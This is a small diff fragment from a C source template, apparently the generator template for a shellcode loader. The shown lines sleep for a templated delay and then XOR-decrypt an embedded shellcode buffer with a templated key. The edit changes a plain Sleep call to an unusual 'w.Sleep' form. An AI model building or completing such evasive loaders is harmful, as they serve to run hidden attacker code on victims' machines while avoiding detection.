@@ -130,7 +130,7 @@ int main( int argc, char *argv[] ) {
     }
 
     /* Sleep */
-    Sleep( ${ SLEEP } );
+    w.Sleep( ${ SLEEP } );
 
     /* Decrypt shellcode */
     xorShellcode( shellcode, shellcode_size, "${KEY}" );
